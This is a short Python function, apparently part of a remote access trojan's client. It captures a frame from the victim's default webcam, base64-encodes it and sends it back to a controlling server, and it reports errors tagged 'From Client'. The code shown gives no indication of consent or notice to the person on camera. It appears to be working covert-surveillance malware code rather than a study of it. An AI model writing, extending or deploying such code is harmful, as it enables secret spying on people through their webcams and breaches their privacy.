import cv2
import base64
import traceback

def send_webcam(self):
    try:
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            raise Exception("No webcam detected")
        
        ret, frame = cap.read()
        cap.release()

        if not ret:
            raise Exception("Failed to capture image from webcam")

        _, buffer = cv2.imencode('.jpg', frame)
        webcam_data_base64 = base64.b64encode(buffer).decode("utf-8")

        self.send_message('response', self.converter.encode({"webcam": webcam_data_base64}))

    except Exception as e:
        self.send_message('response', self.converter.encode({"webcam_logger": f"From Client: {traceback.format_exc()}"}))
